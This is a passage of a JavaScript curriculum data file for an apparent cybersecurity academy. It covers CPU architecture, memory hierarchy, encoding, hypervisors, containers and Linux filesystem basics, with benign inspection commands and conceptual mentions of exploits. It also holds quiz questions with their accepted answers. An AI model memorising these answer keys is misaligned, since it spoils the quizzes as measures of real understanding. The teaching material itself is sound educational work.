/**
 * CALION Cybersecurity Academy — Authoritative Pre-Security Curriculum Manifest (v2)
 * Independent, Modern 12-Room Foundational Cybersecurity Journey
 * 
 * Hierarchy:
 * Stage 1: Computing & Hardware Architecture (Rooms 01–03)
 * Stage 2: Operating Systems & System Internals (Rooms 04–06)
 * Stage 3: Networking Fundamentals & Protocols (Rooms 07–09)
 * Stage 4: Web Security & Applied Cryptography (Rooms 10–12)
 * 
 * Total: 12 Foundational Rooms | 40 Structured Tasks | 36 Knowledge Questions | 1,600 Max Curriculum XP
 */

(function (root, factory) {
  if (typeof module === 'object' && module.exports) {
    module.exports = factory();
  } else {
    const data = factory();
    root.CALION_PRE_SECURITY_CURRICULUM = data.curriculum;
    root.CALION_PRE_SECURITY_ROOMS = data.rooms;
    root.CALION_PRE_SECURITY_ROOM_MAP = data.roomMap;
    root.CALION_PRE_SECURITY_STAGES = data.stages;
  }
})(typeof self !== 'undefined' ? self : this, function () {
  'use strict';

  const stages = [
    {
      id: "ps-stage-01",
      order: 1,
      title: "Computing & Hardware Architecture",
      tagline: "Von Neumann Model, CPU Cycles, Memory Hierarchy & Digital Logic",
      description: "Master foundational computer architecture: the CPU instruction cycle, register banks, memory latency hierarchies, digital logic gates, and virtualization rings.",
      roomCount: 3,
      estimatedTime: "2 hr 30 min",
      color: "#0284c7",
      icon: "memory"
    },
    {
      id: "ps-stage-02",
      order: 2,
      title: "Operating Systems & System Internals",
      tagline: "Linux FHS, Bash Automation, Windows NT & Access Control Lists",
      description: "Explore the core abstractions of modern operating systems: Linux virtual filesystems, command-line stream pipelines, Windows security identifiers (SIDs), and kernel access control.",
      roomCount: 3,
      estimatedTime: "3 hr 15 min",
      color: "#6366f1",
      icon: "terminal"
    },
    {
      id: "ps-stage-03",
      order: 3,
      title: "Networking Fundamentals & Protocols",
      tagline: "OSI Reference Model, TCP 3-Way Handshake, Packet Routing & Firewalls",
      description: "Demystify network data transmission: protocol encapsulation, Layer 2 MAC resolution, IP addressing, TCP state machines, NAT translation, and stateful packet filtering.",
      roomCount: 3,
      estimatedTime: "3 hr 45 min",
      color: "#10b981",
      icon: "hub"
    },
    {
      id: "ps-stage-04",
      order: 4,
      title: "Web Security & Applied Cryptography",
      tagline: "HTTP/S Headers, REST APIs, Symmetric/Asymmetric Ciphers & Threat Models",
      description: "Understand the foundational mechanisms of modern application security: stateless HTTP mechanics, browser isolation boundaries, cryptographic hashing, PKI certificates, and the CIA triad.",
      roomCount: 3,
      estimatedTime: "3 hr 30 min",
      color: "#00F0FF",
      icon: "lock"
    }
  ];

  const rooms = [
    // =========================================================================
    // STAGE 1: COMPUTING & HARDWARE ARCHITECTURE (ps-room-01 to ps-room-03)
    // =========================================================================
    {
      id: "ps-room-01",
      legacyId: "room-01",
      order: 1,
      stageId: "ps-stage-01",
      stageTitle: "Computing & Hardware Architecture",
      stageOrder: 1,
      title: "Introduction to Computers & Von Neumann Architecture",
      tagline: "Von Neumann Model, CPU Execution Cycles & Hardware Privilege Rings",
      description: "Understand the core physical components of modern computers: the Von Neumann architecture, CPU fetch-decode-execute cycle, registers, and execution privilege rings.",
      difficulty: "Foundational",
      estimatedMinutes: 25,
      xp: 50,
      prerequisites: [],
      whyAreYouHere: "Before analyzing software vulnerabilities, cybersecurity engineers must understand how hardware executes instructions and manages memory at the silicon level.",
      diagramSvg: `<svg viewBox="0 0 600 180" class="w-full max-w-xl h-auto" xmlns="http://www.w3.org/2000/svg"><rect x="20" y="20" width="160" height="140" rx="8" fill="#1e293b" stroke="#0284c7" stroke-width="2"/><text x="100" y="45" fill="#38bdf8" font-family="JetBrains Mono" font-size="12" font-weight="bold" text-anchor="middle">CPU Core</text><rect x="35" y="60" width="130" height="35" rx="4" fill="#0f172a" stroke="#475569"/><text x="100" y="82" fill="#e2e8f0" font-family="JetBrains Mono" font-size="10" text-anchor="middle">Control Unit</text><rect x="35" y="105" width="130" height="40" rx="4" fill="#0f172a" stroke="#475569"/><text x="100" y="130" fill="#e2e8f0" font-family="JetBrains Mono" font-size="10" text-anchor="middle">ALU &amp; Registers</text><line x1="180" y1="90" x2="260" y2="90" stroke="#00f0ff" stroke-width="3" stroke-dasharray="4"/><polygon points="260,86 268,90 260,94" fill="#00f0ff"/><polygon points="180,86 172,90 180,94" fill="#00f0ff"/><rect x="268" y="20" width="140" height="140" rx="8" fill="#1e293b" stroke="#6366f1" stroke-width="2"/><text x="338" y="45" fill="#818cf8" font-family="JetBrains Mono" font-size="12" font-weight="bold" text-anchor="middle">Main Memory</text><rect x="283" y="65" width="110" height="35" rx="4" fill="#0f172a" stroke="#475569"/><text x="338" y="87" fill="#e2e8f0" font-family="JetBrains Mono" font-size="10" text-anchor="middle">Instructions (Code)</text><rect x="283" y="110" width="110" height="35" rx="4" fill="#0f172a" stroke="#475569"/><text x="338" y="132" fill="#e2e8f0" font-family="JetBrains Mono" font-size="10" text-anchor="middle">Data (Heap/Stack)</text><line x1="408" y1="90" x2="460" y2="90" stroke="#a855f7" stroke-width="3"/><polygon points="460,86 468,90 460,94" fill="#a855f7"/><polygon points="408,86 400,90 408,94" fill="#a855f7"/><rect x="468" y="40" width="110" height="100" rx="8" fill="#1e293b" stroke="#a855f7" stroke-width="2"/><text x="523" y="80" fill="#c084fc" font-family="JetBrains Mono" font-size="11" font-weight="bold" text-anchor="middle">I/O Devices</text><text x="523" y="105" fill="#94a3b8" font-family="JetBrains Mono" font-size="9" text-anchor="middle">Disk / Network</text></svg>`,
      tryInteractive: {
        expectedCommand: "lscpu",
        simulatedOutput: "Architecture: x86_64\nCPU op-mode(s): 32-bit, 64-bit\nByte Order: Little Endian\nModel name: Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz"
      },
      objectives: [
        "Identify the four primary components of the Von Neumann architecture",
        "Trace the instruction execution flow through the CPU fetch-decode-execute cycle",
        "Differentiate between volatile main memory (RAM) and non-volatile storage",
        "Explain the security boundary enforced by CPU hardware privilege rings (Ring 0 vs Ring 3)"
      ],
      lessons: [
        {
          id: "ps-task-01-01",
          taskNumber: 1,
          title: "Von Neumann Architecture & The Execution Cycle",
          concept: "The Von Neumann architecture forms the foundation of nearly every general-purpose computing system in existence. Proposed by mathematician and physicist John von Neumann in 1945, its central breakthrough was the stored-program concept: both program instructions and working data share the same physical addressable memory space.\n\nThe system comprises three primary subsystems connected by system buses:\n1. Central Processing Unit (CPU): Contains the Arithmetic Logic Unit (ALU) for arithmetic/logical operations and the Control Unit (CU) which directs instruction sequencing.\n2. Main Memory (RAM): A linear sequence of byte-addressable cells storing active code and operational data.\n3. Input/Output (I/O) Interfaces: Bridges communicating with peripheral storage, network cards, and human interfaces.\n\nThe execution cycle operates in an endless loop:\n- FETCH: The Control Unit reads the memory address stored in the Program Counter (PC), loads the instruction from RAM across the data bus into the Instruction Register (IR), and increments the PC.\n- DECODE: The Instruction Decoder interprets the opcode (operation code) and operands.\n- EXECUTE: The ALU executes the required arithmetic or logical operation, storing results in accumulator registers or memory.\n\nFrom a security perspective, because code and data share the same memory space, an adversary who can overwrite data memory (e.g., via a buffer overflow) can potentially divert the Program Counter to execute malicious shellcode.",
          whyItMatters: "Nearly all memory corruption exploits (buffer overflows, return-oriented programming) exploit the Von Neumann architectural reality that code and data share the exact same addressable physical memory.",
          examples: [
            "Program Counter (PC): Holds the address of the next machine instruction to be fetched.",
            "Memory Address Register (MAR): Holds the physical memory address currently being read or written.",
            "Memory Data Register (MDR): Holds the actual data payload read from or written to memory."
          ],
          commands: [
            { cmd: "lscpu", desc: "Display CPU architecture, cores, cache lines, and virtualization flags in Linux" },
            { cmd: "cat /proc/cpuinfo", desc: "Inspect detailed low-level hardware attributes for each logical processor core" }
          ],
          reviewSummary: {
            coreTakeaway: "Von Neumann computers store code and data in the same unified memory space, making execution flow redirection possible when memory boundaries are violated.",
            learningOutcome: "Mastered CPU instruction execution cycles and register operations."
          }
        },
        {
          id: "ps-task-01-02",
          taskNumber: 2,
          title: "Memory Hierarchy & Volatility",
          concept: "Computer memory is organized in a hierarchical trade-off between latency, cost, and physical capacity. At the pinnacle are CPU Internal Registers, operating at CPU clock frequency (<1 nanosecond latency) but storing only dozens of bytes.\n\nNext are hardware caches:\n- L1 Cache: Split into Instruction (L1i) and Data (L1d) caches, typically 32–64 KB per core, ~1 ns latency.\n- L2 Cache: Dedicated per-core cache, ~512 KB–1 MB, ~3–5 ns latency.\n- L3 Cache: Shared across all cores, 16–64 MB, ~10–20 ns latency.\n\nBelow cache lies Main Memory (DRAM): High capacity (8–128 GB), ~60–80 ns latency. DRAM is strictly volatile: it relies on capacitive charge retention that degrades within milliseconds without electrical power.\n\nAt the bottom lies Non-Volatile Storage (NVMe SSDs, SATA drives, optical media): Retains persistent data across power cycles with access latencies measured in microseconds (SSDs) or milliseconds (HDDs).\n\nIn digital forensics and incident response, memory volatility dictates evidence preservation order (RFC 3227 Order of Volatility): live RAM must be captured immediately before powering down an affected machine, as ephemeral volatile memory contains encryption keys, active process injections, and unencrypted network sockets.",
          whyItMatters: "Volatile RAM holds live plaintext credentials, active malware processes, and decrypted communications that evaporate the instant power is disconnected.",
          examples: [
            "Order of Volatility: Registers/Cache → Physical RAM → Network Sockets → Disk Storage → Archival Backups.",
            "Cold Boot Attack: Freezing DRAM chips immediately after power loss to read residual capacitive state before decay."
          ],
          commands: [
            { cmd: "free -h", desc: "Display current total, used, and free RAM and swap space in human-readable units" },
            { cmd: "vmstat 1 5", desc: "Stream real-time virtual memory, process, and paging performance metrics every second" }
          ],
          reviewSummary: {
            coreTakeaway: "Memory exists in a strict trade-off between speed and persistence; volatile RAM must always be acquired first during incident response.",
            learningOutcome: "Understood the physical memory hierarchy and RFC 3227 order of volatility."
          }
        },
        {
          id: "ps-task-01-03",
          taskNumber: 3,
          title: "Hardware Privilege Rings & Kernel Isolation",
          concept: "Modern x86 and ARM processors enforce hardware privilege levels known as Hierarchical Protection Rings. These rings isolate critical operating system functions from untrusted user applications.\n\nx86 architecture defines four rings (Ring 0 to Ring 3):\n- Ring 0 (Kernel Mode / Supervisor): The most privileged ring. Code executing in Ring 0 has unrestricted access to all physical hardware instructions, memory addresses, CPU control registers (CR0, CR3, CR4), and I/O ports. Device drivers and the operating system kernel execute here.\n- Ring 1 & Ring 2: Historically designated for OS services and device drivers, but largely unused by modern operating systems.\n- Ring 3 (User Mode): The least privileged ring. Standard user applications (browsers, text editors, user processes) execute here with heavily restricted instructions. Ring 3 code cannot directly access hardware, modify memory page tables, or disable CPU interrupts.\n\nWhen a User Mode application requires hardware access (e.g., reading a file from disk or sending a network packet), it cannot do so directly. It must trigger a hardware interrupt or execute a special instruction (such as `syscall` on x86-64 or `int 0x80` on x86) to request a System Call. The CPU transitions privilege from Ring 3 to Ring 0, the kernel validates the request and parameters, performs the requested action, and returns control back to Ring 3.\n\nPrivilege escalation exploits seek to break out of Ring 3 into Ring 0 through kernel vulnerabilities, granting an attacker total control over the entire machine.",
          whyItMatters: "Privilege rings provide the fundamental silicon-enforced barrier preventing malicious user-space applications from compromising the underlying operating system.",
          examples: [
            "Ring 0 (Supervisor): Full physical hardware and memory access; kernel space.",
            "Ring 3 (User Space): Sandboxed execution; hardware access strictly gated via system calls."
          ],
          commands: [
            { cmd: "uname -r", desc: "Output the current Linux operating system kernel release version" },
            { cmd: "dmesg | head -n 20", desc: "Examine kernel ring buffer initialization messages and hardware drivers" }
          ],
          reviewSummary: {
            coreTakeaway: "Hardware privilege rings guarantee that user-space software cannot execute kernel-level instructions without explicit OS mediation.",
            learningOutcome: "Understood Ring 0 vs Ring 3 execution models and system call mediation."
          }
        }
      ],
      questions: [
        {
          id: "ps-q-01-01",
          taskId: "ps-task-01-01",
          taskIndex: 0,
          type: "exact",
          question: "Which CPU register stores the memory address of the next machine instruction to be fetched?",
          acceptedAnswers: ["program counter", "pc", "Program Counter", "PC", "instruction pointer", "Instruction Pointer", "ip", "IP"],
          answerLength: 15,
          hint: "It counts instructions sequentially in memory...",
          explanation: "The Program Counter (PC) holds the memory address of the next instruction to be fetched from memory into the Instruction Register.",
          xp: 25
        },
        {
          id: "ps-q-01-02",
          taskId: "ps-task-01-02",
          taskIndex: 1,
          type: "choice",
          question: "What happens to the data stored in volatile memory (such as DRAM) when electrical power is completely cut off?",
          options: [
            "Data is permanently written to disk automatically",
            "Data decays and is completely erased",
            "Data remains intact indefinitely until manually deleted",
            "Data is securely encrypted by the CPU"
          ],
          correctIndex: 1,
          hint: "Think about the definition of volatile...",
          explanation: "Volatile memory relies on continuous electrical charge refresh cycles. Without power, the capacitive charge degrades and all stored data is lost.",
          xp: 25
        },
        {
          id: "ps-q-01-03",
          taskId: "ps-task-01-03",
          taskIndex: 2,
          type: "exact",
          question: "In x86 CPU hardware privilege ring architecture, which ring represents Kernel Mode with full hardware execution access?",
          acceptedAnswers: ["ring 0", "0", "Ring 0"],
          answerLength: 6,
          hint: "The most privileged level, represented by a single digit...",
          explanation: "Ring 0 (Supervisor mode) provides total, unrestricted access to the underlying processor instructions, memory page tables, and hardware peripherals.",
          xp: 25
        }
      ]
    },

    {
      id: "ps-room-02",
      legacyId: "room-02",
      order: 2,
      stageId: "ps-stage-01",
      stageTitle: "Computing & Hardware Architecture",
      stageOrder: 1,
      title: "Digital Logic, Data Representation & Bitwise Operations",
      tagline: "Binary Arithmetic, Hexadecimal, Bitwise Logic & Character Encoding",
      description: "Master foundational low-level data representation: binary arithmetic, two's complement signed integers, bitwise operations (AND, OR, XOR, NOT), hexadecimal encoding, and ASCII/UTF-8 character sets.",
      difficulty: "Foundational",
      estimatedMinutes: 25,
      xp: 50,
      prerequisites: ["ps-room-01"],
      whyAreYouHere: "Every cryptographic cipher, network packet header, memory offset, and machine code instruction is fundamentally expressed in binary and hexadecimal format.",
      objectives: [
        "Perform binary to decimal and binary to hexadecimal conversions fluently",
        "Apply bitwise logic operators (AND, OR, XOR, NOT, Shift) to bitmasks",
        "Understand signed integer representation using Two's Complement",
        "Explain ASCII and UTF-8 character encoding standards"
      ],
      lessons: [
        {
          id: "ps-task-02-01",
          taskNumber: 1,
          title: "Binary & Hexadecimal Numbering Systems",
          concept: "Digital computers represent all internal states using electrical transistors functioning as binary switches: 0 (off) or 1 (on). A single binary digit is a bit; eight bits form a byte, capable of representing 256 unique values (0 to 255 in unsigned decimal notation).\n\nBecause raw binary strings (e.g., `1101111010101101`) are cumbersome for humans to read, computer scientists use Hexadecimal (Base 16). Base 16 uses digits `0–9` and letters `A–F` (where A=10, B=11, C=12, D=13, E=14, F=15). Exactly four binary bits (a nibble) correspond cleanly to one hexadecimal character:\n- `0000` = `0x0`\n- `1010` = `0xA` (decimal 10)\n- `1111` = `0xF` (decimal 15)\n- `1111 1111` = `0xFF` (decimal 255)\n\nIn programming and cybersecurity tools, hexadecimal values are conventionally prefixed with `0x` (e.g., `0x7FFF`). Memory addresses, cryptographic hashes, MAC addresses, and raw packet bytes are universally represented in hexadecimal.",
          whyItMatters: "Hexadecimal is the standard lingua franca of reverse engineering, memory dump inspection, and network packet analysis.",
          examples: [
            "Binary `1100` = `1*(8) + 1*(4) + 0*(2) + 0*(1)` = Decimal `12` = Hex `0xC`",
            "Byte `0x41` in hexadecimal = Decimal `65` = Character 'A' in standard ASCII"
          ],
          commands: [
            { cmd: "printf '%x\\n' 255", desc: "Convert decimal 255 to hexadecimal notation using standard shell printf" },
            { cmd: "echo -n 'CALION' | xxd -p", desc: "Print the raw hexadecimal byte dump of a string" }
          ],
          reviewSummary: {
            coreTakeaway: "Hexadecimal directly compresses 4 binary bits into a single readable character, serving as the universal language of memory and packet analysis.",
            learningOutcome: "Mastered binary-hexadecimal-decimal conversions."
          }
        },
        {
          id: "ps-task-02-02",
          taskNumber: 2,
          title: "Bitwise Operators & Cryptographic Logic",
          concept: "Bitwise operations manipulate individual bits directly within the CPU ALU in a single clock cycle. The primary bitwise operators are:\n- AND (`&`): Outputs 1 only if BOTH input bits are 1. Commonly used for subnet masking and bit extraction.\n- OR (`|`): Outputs 1 if AT LEAST ONE input bit is 1. Commonly used for setting flag bits.\n- NOT (`~`): Unary inversion. Inverts every bit (0 becomes 1, 1 becomes 0).\n- XOR (`^`): Exclusive OR. Outputs 1 if and only if the input bits are DIFFERENT (`0^1=1`, `1^0=1`, `0^0=0`, `1^1=0`).\n\nXOR is uniquely significant in cybersecurity and cryptography for two mathematical properties:\n1. Reversibility: `(A ^ B) ^ B = A`. If you XOR plaintext `A` with key `B` to produce ciphertext `C`, XORing `C` with key `B` reproduces the exact plaintext `A`. This property forms the foundation of One-Time Pads and stream ciphers (such as ChaCha20 and AES-CTR mode).\n2. Equal Probability: When a random key bit is XORed with any plaintext bit, the resulting bit has an exact 50% probability of being 0 or 1, introducing zero statistical bias.",
          whyItMatters: "The XOR operation is the mathematical bedrock of symmetric cryptography, one-time pads, and malware obfuscation techniques.",
          examples: [
            "Bitwise AND: `1100 & 1010` = `1000`",
            "Bitwise OR:  `1100 | 1010` = `1110`",
            "Bitwise XOR: `1100 ^ 1010` = `0110`"
          ],
          commands: [
            { cmd: "python3 -c 'print(hex(0x41 ^ 0x20))'", desc: "Compute bitwise XOR in Python (0x41 'A' ^ 0x20 toggles case to 0x61 'a')" }
          ],
          reviewSummary: {
            coreTakeaway: "Bitwise XOR is self-inverting and universally utilized across symmetric encryption, hashing primitives, and obfuscation.",
            learningOutcome: "Understood bitwise logic operations and the cryptographic properties of XOR."
          }
        },
        {
          id: "ps-task-02-03",
          taskNumber: 3,
          title: "Character Encoding: ASCII, Unicode & Endianness",
          concept: "Computers only store numbers; character encoding schemes define how numeric values map to human-readable text characters.\n\n- ASCII (American Standard Code for Information Interchange): A 7-bit encoding standard established in 1963, representing 128 characters (codes 0 to 127). It defines control codes (0–31), uppercase letters (`0x41` 'A' to `0x5A` 'Z'), lowercase letters (`0x61` 'a' to `0x7A` 'z'), and numbers (`0x30` '0' to `0x39` '9').\n- UTF-8 (Unicode Transformation Format): A backward-compatible, variable-length encoding system using 1 to 4 bytes per character. Standard ASCII characters occupy exactly 1 byte with identical byte values, while international characters, symbols, and emojis occupy 2 to 4 bytes.\n\nEndianness describes the byte order in which multi-byte integers are stored in physical computer memory:\n- Little-Endian: The least significant byte (LSB) is stored at the lowest memory address. Used by x86 and ARM processors.\n- Big-Endian (Network Byte Order): The most significant byte (MSB) is stored at the lowest memory address. Used across standard Internet protocols (TCP/IP packet headers).\n\nFor example, the 32-bit hex integer `0xAABBCCDD` stored at address 0x1000:\n- Little-Endian: `[0x1000]=0xDD`, `[0x1001]=0xCC`, `[0x1002]=0xBB`, `[0x1003]=0xAA`\n- Big-Endian:    `[0x1000]=0xAA`, `[0x1001]=0xBB`, `[0x1002]=0xCC`, `[0x1003]=0xDD`",
          whyItMatters: "Understanding byte ordering (Little vs Big Endian) is essential when inspecting network packets with Wireshark or reverse engineering binary executables in GDB.",
          examples: [
            "ASCII 0x41 = Decimal 65 = Capital letter 'A'",
            "Network Byte Order is strictly Big-Endian per RFC 791."
          ],
          commands: [
            { cmd: "man ascii", desc: "Display the standard octal, decimal, and hexadecimal ASCII lookup table in Linux" }
          ],
          reviewSummary: {
            coreTakeaway: "Data representation bridges raw binary memory with human text; Little-Endian governs x86 processors while Big-Endian governs network protocols.",
            learningOutcome: "Understood character encoding systems and multi-byte memory endianness."
          }
        }
      ],
      questions: [
        {
          id: "ps-q-02-01",
          taskId: "ps-task-02-01",
          taskIndex: 0,
          type: "exact",
          question: "How many binary bits are grouped together to form a single hexadecimal digit?",
          acceptedAnswers: ["4", "four", "4 bits"],
          answerLength: 1,
          hint: "Think about a nibble...",
          explanation: "Each hexadecimal character represents exactly 4 bits (a nibble), allowing values from 0000 (0) to 1111 (15 / F).",
          xp: 25
        },
        {
          id: "ps-q-02-02",
          taskId: "ps-task-02-02",
          taskIndex: 1,
          type: "exact",
          question: "Which bitwise logical operation outputs a 1 only when the two input bits differ, making it fundamental to symmetric ciphers?",
          acceptedAnswers: ["xor", "XOR", "exclusive or", "Exclusive OR"],
          answerLength: 3,
          hint: "Exclusive OR...",
          explanation: "XOR (Exclusive OR) outputs 1 only when input bits are distinct. Because (A ^ B) ^ B = A, it is widely used in stream ciphers and one-time pads.",
          xp: 25
        },
        {
          id: "ps-q-02-03",
          taskId: "ps-task-02-03",
          taskIndex: 2,
          type: "exact",
          question: "In internet networking protocols (such as IP headers), what byte order convention is universally defined as Network Byte Order?",
          acceptedAnswers: ["big endian", "big-endian", "Big Endian", "Big-Endian"],
          answerLength: 10,
          hint: "Most significant byte stored first...",
          explanation: "Network Byte Order is standard Big-Endian: the most significant byte is transmitted and stored at the lowest memory address.",
          xp: 25
        }
      ]
    },

    {
      id: "ps-room-03",
      legacyId: "room-03",
      order: 3,
      stageId: "ps-stage-01",
      stageTitle: "Computing & Hardware Architecture",
      stageOrder: 1,
      title: "Virtualization, Hypervisors & Sandboxing",
      tagline: "Type 1 vs Type 2 Hypervisors, VT-x, Namespaces & Containerization",
      description: "Understand hardware isolation techniques: bare-metal Type 1 hypervisors, hosted Type 2 hypervisors, hardware-assisted virtualization (Intel VT-x / AMD-V), and Linux kernel container namespaces.",
      difficulty: "Foundational",
      estimatedMinutes: 25,
      xp: 50,
      prerequisites: ["ps-room-02"],
      whyAreYouHere: "Modern cybersecurity relies entirely on virtualization for malware analysis detonation chambers, isolated lab targets, cloud infrastructure, and defensive honeytokens.",
      objectives: [
        "Contrast Type 1 (Bare-Metal) vs Type 2 (Hosted) hypervisors",
        "Explain hardware-assisted virtualization extensions (Intel VT-x / AMD-V)",
        "Understand container isolation via Linux namespaces and cgroups",
        "Identify VM escape and sandbox detection risks"
      ],
      lessons: [
        {
          id: "ps-task-03-01",
          taskNumber: 1,
          title: "Hypervisors: Type 1 (Bare Metal) vs Type 2 (Hosted)",
          concept: "A Hypervisor (or Virtual Machine Monitor, VMM) is software, firmware, or hardware that creates and manages virtual machines (VMs). Virtual machines abstract the physical hardware, presenting guest operating systems with virtualized CPU cores, virtual memory tables, and synthetic network interfaces.\n\nHypervisors fall into two distinct architectures:\n1. Type 1 Hypervisor (Bare-Metal): Installs directly on the bare physical server hardware without any host operating system underneath. The hypervisor possesses direct access to hardware resources, delivering near-native performance, low latency, and enterprise-grade reliability. Examples include VMware ESXi, Proxmox VE, Microsoft Hyper-V, and Linux KVM.\n2. Type 2 Hypervisor (Hosted): Runs as a standard application inside an existing host operating system (like Windows, macOS, or desktop Linux). The guest OS instructions must be mediated through both the hypervisor and the host OS kernel, introducing performance overhead. Examples include Oracle VirtualBox, VMware Workstation, and UTM.\n\nIn enterprise cloud environments (AWS, Azure, Google Cloud), Type 1 hypervisors isolate multi-tenant customer workloads on shared physical blade servers.",
          whyItMatters: "Enterprise security architecture and cloud computing rely on hypervisor isolation boundaries to enforce multi-tenant isolation.",
          examples: [
            "Type 1 (Bare-Metal): VMware ESXi, KVM, Xen, Hyper-V.",
            "Type 2 (Hosted): Oracle VirtualBox, VMware Workstation, Parallels."
          ],
          commands: [
            { cmd: "systemd-detect-virt", desc: "Detect whether the current Linux instance is executing inside a VM, container, or bare metal" },
            { cmd: "grep -E '(vmx|svm)' /proc/cpuinfo", desc: "Check if the CPU supports Intel VT-x (vmx) or AMD-V (svm) hardware virtualization" }
          ],
          reviewSummary: {
            coreTakeaway: "Type 1 hypervisors run directly on server hardware for maximum speed and security; Type 2 hypervisors run inside a host operating system.",
            learningOutcome: "Understood hypervisor categories and enterprise virtualization models."
          }
        },
        {
          id: "ps-task-03-02",
          taskNumber: 2,
          title: "Containers vs Virtual Machines (Namespaces & Cgroups)",
          concept: "While Virtual Machines virtualize the underlying physical hardware (each guest VM running its own full, independent kernel and OS), Containers virtualize the operating system kernel itself.\n\nIn Linux, containers are not separate machines; they are regular processes running on the host kernel, isolated by two core kernel primitives:\n1. Linux Namespaces: Restrict what a process can SEE. Namespaces provide isolated views of system resources:\n   - PID Namespace: Process trees (the container process appears as PID 1 inside the container).\n   - NET Namespace: Network devices, IP addresses, routing tables, and firewall rules.\n   - MNT Namespace: Filesystem mount points.\n   - IPC Namespace: Inter-process communication and shared memory segments.\n   - UTS Namespace: Hostname and domain name.\n   - USER Namespace: User and group IDs (mapping root inside container to non-root outside).\n2. Control Groups (cgroups): Restrict what a process can USE. Cgroups enforce resource quotas on CPU time, RAM memory usage, disk I/O throughput, and maximum process counts.\n\nBecause containers share the host kernel, they start in milliseconds and use negligible overhead compared to VMs, but a vulnerability in the shared host kernel can allow a container escape to compromise the entire physical host.",
          whyItMatters: "Securing containerized microservices requires hardening the shared Linux kernel and preventing container breakout vulnerabilities.",
          examples: [
            "VM: Complete virtual hardware + full guest kernel + guest user space.",
            "Container: Shared host kernel + isolated namespaces + cgroup resource limits."
          ],
          commands: [
            { cmd: "lsns", desc: "List all active Linux kernel namespaces on the system with associated process IDs" },
            { cmd: "docker ps", desc: "List currently running container instances if the Docker daemon is installed" }
          ],
          reviewSummary: {
            coreTakeaway: "Containers isolate processes using Linux kernel namespaces and cgroups, sharing the host kernel rather than emulating virtual hardware.",
            learningOutcome: "Contrasted hypervisor VMs with containerization architecture."
          }
        }
      ],
      questions: [
        {
          id: "ps-q-03-01",
          taskId: "ps-task-03-01",
          taskIndex: 0,
          type: "exact",
          question: "Which type of hypervisor installs directly onto the physical server hardware without requiring an underlying host operating system?",
          acceptedAnswers: ["type 1", "Type 1", "type-1", "bare metal", "bare-metal"],
          answerLength: 6,
          hint: "Think about bare-metal hypervisors (Type 1 or Type 2)...",
          explanation: "Type 1 (Bare-Metal) hypervisors execute directly on the bare server hardware, bypassing the overhead of a host operating system.",
          xp: 25
        },
        {
          id: "ps-q-03-02",
          taskId: "ps-task-03-02",
          taskIndex: 1,
          type: "choice",
          question: "Which Linux kernel feature is specifically responsible for restricting what system resources (such as CPU, RAM, and disk I/O) a container can use?",
          options: [
            "Control Groups (cgroups)",
            "Systemd journals",
            "Cron schedulers",
            "Kernel Ring 3"
          ],
          correctIndex: 0,
          hint: "Cgroups manage resource limits, while namespaces manage visibility...",
          explanation: "Control Groups (cgroups) allocate and limit hardware resources (CPU, RAM, block I/O) among process groups, preventing denial of service.",
          xp: 25
        }
      ]
    },

    // =========================================================================
    // STAGE 2: OPERATING SYSTEMS & SYSTEM INTERNALS (ps-room-04 to ps-room-06)
    // =========================================================================
    {
      id: "ps-room-04",
      legacyId: "room-04",
      order: 4,
      stageId: "ps-stage-02",
      stageTitle: "Operating Systems & System Internals",
      stageOrder: 2,
      title: "Linux Filesystem Hierarchy & Permission Architecture",
      tagline: "FHS Standard, Inodes, Octal Permissions, SUID & Capabilities",
      description: "Master the Linux operating system layout: the Filesystem Hierarchy Standard (FHS), inode metadata, read/write/execute (rwx) octal permissions, SUID/SGID execution bits, and Linux capabilities.",
      difficulty: "Foundational",
      estimatedMinutes: 30,
      xp: 50,
      prerequisites: ["ps-room-03"],
      whyAreYouHere: "Over 80% of enterprise web servers, cloud containers, and cybersecurity toolchains run on Linux; misconfigured file permissions are a primary vector for privilege escalation.",
      objectives: [
        "Navigate core directories of the Linux Filesystem Hierarchy Standard (FHS)",
        "Calculate and interpret traditional numeric octal permissions (e.g. 755, 644, 400)",
        "Identify security risks associated with SUID/SGID executable binaries",
        "Inspect process metadata exposed via the /proc pseudo-filesystem"
      ],
      lessons: [
        {
          id: "ps-task-04-01",
          taskNumber: 1,
          title: "The Linux Filesystem Hierarchy Standard (FHS)",
          concept: "Linux organizes all files, directories, and hardware devices in a single unified hierarchical tree originating from the Root directory (`/`). Unlike Windows with drive letters (`C:\\`, `D:\\`), physical partitions in Linux are mounted onto directories within the unified root tree.\n\nCore FHS directories:\n- `/bin` & `/sbin`: Essential user and system administration binary executables.\n- `/etc`: System-wide configuration files (e.g., `/etc/passwd`, `/etc/shadow`, `/etc/network/interfaces`).\n- `/home`: User personal workspaces and configuration dotfiles.\n- `/root`: The dedicated home directory for the superuser (root).\n- `/var`: Variable runtime data: log files (`/var/log`), mail spools, and web roots (`/var/www/html`).\n- `/tmp`: Temporary storage accessible to all users, cleared upon reboot.\n- `/dev`: Device nodes representing physical or synthetic hardware (e.g., `/dev/sda` disk, `/dev/urandom` PRNG, `/dev/null` black hole).\n- `/proc` & `/sys`: Virtual pseudo-filesystems generated dynamically in RAM by the kernel. They contain no physical disk files; `/proc` exposes real-time process metadata, memory metrics, and kernel parameters.",
          whyItMatters: "Knowing where security-critical configuration files and log files reside is paramount during defensive audits and forensic examinations.",
          examples: [
            "`/etc/passwd`: Publicly readable user account database.",
            "`/etc/shadow`: Restricted file storing cryptographic password hashes (accessible only by root).",
            "`/proc/[PID]/cmdline`: The exact command-line arguments invoked for running process [PID]."
          ],
          commands: [
            { cmd: "ls -la /etc/passwd", desc: "Inspect file permissions and ownership of the system user account database" },
            { cmd: "cat /proc/version", desc: "Read kernel version directly from the dynamic /proc pseudo-filesystem" }
          ],
          reviewSummary: {
            coreTakeaway: "Linux structures all resources under a single root tree `/`, exposing hardware via `/dev` and kernel state via `/proc`.",
            learningOutcome: "Mastered Linux FHS navigation and critical system directory roles."
          }
        },
        {
          id: "ps-task-04-02",
          taskNumber: 2,
          title: "File Permissions: Symbolic, Octal & Special Bits (SUID)",
